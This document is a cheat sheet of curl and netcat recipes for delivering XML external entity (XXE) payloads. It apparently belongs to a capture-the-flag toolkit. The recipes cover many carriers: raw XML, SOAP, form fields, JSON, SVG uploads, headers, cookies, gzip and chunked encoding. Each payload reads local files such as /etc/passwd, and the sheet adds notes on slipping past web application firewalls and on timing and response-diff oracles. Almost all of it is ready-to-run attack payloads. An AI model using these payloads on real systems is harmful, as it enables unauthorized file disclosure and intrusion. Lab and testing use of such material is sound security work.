# HTTP Send Recipes — the request shapes that deliver XXE

## The five content-type forms

### `application/xml` — the canonical

```bash
curl -X POST http://target/endpoint \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
```

### `text/xml` — the SOAP-ish legacy

```bash
curl -X POST http://target/endpoint \
  -H 'Content-Type: text/xml' \
  -H 'SOAPAction: "SomeAction"' \
  -d '<?xml?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><m:m xmlns:m="u"><m:p>&x;</m:p></m:m></soap:Body></soap:Envelope>'
```

### `application/x-www-form-urlencoded` — the XML-in-a-field

```bash
curl -X POST http://target/endpoint \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'xml=<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]><r>&x;</r>'
```

The field name is whatever the app reads — `xml`/`data`/`config`/
`payload`/`body`/`request`/`content`.

### `application/json` — the nested XML

```bash
curl -X POST http://target/endpoint \
  -H 'Content-Type: application/json' \
  -d '{"xml": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///flag\">]><r>&x;</r>"}'
```

The field name the app extracts — `xml`/`body`/`data`/`document`/
`config`/`payload`.

### `multipart/form-data` — the file-upload carrier

```bash
printf '%s' '<?xml?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]><r>&x;</r>' > /tmp/x.xml
curl -X POST http://target/upload -F 'file=@/tmp/x.xml;type=image/svg+xml' -F 'name=x.svg'
```

The `.svg`/`.docx`/`.xml`/`.plist` extension decides which parser.

## The payload-in-file form — for complex payloads

```bash
cat > /tmp/xxe.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
EOF
curl -X POST http://target/endpoint -H 'Content-Type: application/xml' --data-binary @/tmp/xxe.xml
```

`--data-binary` preserves the bytes verbatim — no shell-escape mangling.

## The gzip-transport — `Content-Encoding: gzip`

```bash
gzip -c /tmp/xxe.xml > /tmp/xxe.xml.gz
curl -X POST http://target/endpoint \
  -H 'Content-Type: application/xml' \
  -H 'Content-Encoding: gzip' \
  --data-binary @/tmp/xxe.xml.gz
```

If the app decompresses before parsing — the WAF saw compressed bytes.

## The chunked-transfer form — `Transfer-Encoding: chunked`

```bash
printf 'POST /e HTTP/1.1\r\nHost: t\r\nContent-Type: application/xml\r\nTransfer-Encoding: chunked\r\n\r\n%x\r\n%s\r\n0\r\n\r\n' "${#xml}" "$xml" | nc target 80
```

Some parsers/WAFs reassemble chunked differently — a smuggling-adjacent
disguise.

## The double-request pattern — baseline + probe

```bash
# 1. baseline — clean XML
curl -X POST http://target/endpoint -H 'Content-Type: application/xml' -d '<?xml?><r>x</r>' -o /tmp/base.txt -s

# 2. entity probe
curl -X POST http://target/endpoint -H 'Content-Type: application/xml' -d '<?xml?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>' -o /tmp/probe.txt -s

# 3. diff
diff /tmp/base.txt /tmp/probe.txt
```

The baseline-diff is the detection — not just "did it work" but "what
changed".

## The status/body/time capture — the full observability

```bash
curl -X POST http://target/endpoint \
  -H 'Content-Type: application/xml' \
  --data-binary @/tmp/xxe.xml \
  -o /tmp/resp.txt \
  -w 'status=%{http_code} len=%{size_download} time=%{time_total}\n' -s
```

`-w` captures the metadata the parser's response shape reveals — the
status/body/time the response-diff uses.

## The header-injection variants — XML in a header

```bash
curl -X POST http://target/endpoint -H 'X-Custom: <?xml?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]><r>&x;</r>'
```

If the app reads a header and feeds it to XML — rare — the `X-Custom`
channel.

## The redirect-following form — `Location:`-chain

```bash
curl -L -X POST http://target/endpoint -H 'Content-Type: application/xml' --data-binary @/tmp/xxe.xml -v
```

`-v` shows the `Location:`/`Content-Location:` the app builds from your
entity URI — a redirect built from an entity = a leak channel.

## The timing-oracle — `-w` + a slow-entity

```bash
curl -X POST http://target/endpoint \
  -H 'Content-Type: application/xml' \
  --data-binary @/tmp/xxe-slow.xml \
  -w 'time=%{time_total}\n' -o /dev/null -s
```

A param-entity that fetches a slow URL → the request takes measurable
time — the timing-channel oracle for "did the entity resolve".

## The cookie/auth-carried XML

```bash
curl -X POST http://target/endpoint \
  -H 'Cookie: session=<xml>' \
  -H 'Content-Type: application/xml' \
  --data-binary @/tmp/xxe.xml
```

If the app parses a session/profile cookie as XML — the cookie is the
injection point.

## The "the response IS the evidence" — `http_probe`

All of the above route through `tools/web/http_probe.py` for the
evidence-gate — the tool emits `post-probe` with `--response` filled:

```bash
python3 tools/web/http_probe.py --challenge <name> \
  --url http://target/endpoint \
  --method POST \
  --header "Content-Type: application/xml" \
  --body "$(cat /tmp/xxe.xml)"
```
